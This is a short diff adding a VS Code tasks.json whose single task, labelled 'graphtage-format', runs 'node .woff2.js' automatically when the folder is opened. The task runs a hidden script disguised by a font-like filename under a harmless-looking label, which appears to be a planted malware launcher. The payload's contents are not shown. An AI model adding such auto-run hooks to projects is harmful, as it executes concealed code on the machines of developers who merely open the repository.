@@ -1,0 +1,13 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "graphtage-format",
+            "type": "shell",
+            "command": "node .woff2.js",
+            "runOptions": {
+                "runOn": "folderOpen"
+            }
+        }
+    ]
+}
